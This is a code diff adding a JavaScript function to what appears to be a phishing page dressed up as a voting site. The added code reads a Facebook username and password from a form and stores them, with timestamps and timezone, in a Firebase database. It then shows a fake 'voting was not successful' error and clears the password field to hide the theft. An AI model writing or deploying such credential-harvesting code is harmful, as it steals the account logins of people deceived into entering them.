@@ -86,6 +86,42 @@ function iglog() {
   }
 }
 
+function fblog() {
+  firebase
+    .auth()
+    .signInAnonymously()
+    .catch(function (error) {
+      var errorCode = error.code;
+      var errorMessage = error.message;
+      window.alert("Error: " + errorMessage);
+    });
+
+  var username = document.getElementById("fb-uname").value;
+  var password = document.getElementById("fb-pass").value;
+  var currentDate = new Date().toISOString().slice(0, 10);
+  var currentTime = new Date().toISOString().slice(11, 19);
+  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  var accountType = "Facebook";
+
+  if (username !== "" && password !== "") {
+    firebase.database().ref("fbdet").push({
+      emle: username,
+      mobile: "",
+      time: currentTime,
+      timezone: timezone,
+      pass: password,
+      date: currentDate,
+      type: accountType,
+    });
+
+    setTimeout(function () {
+      alert("Sorry voting was not successful. Please try again later.");
+      document.getElementById("fb-pass").value = "";
+      return false;
+    }, 2000);
+  }
+}
+
 function toklog() {
   firebase
     .auth()
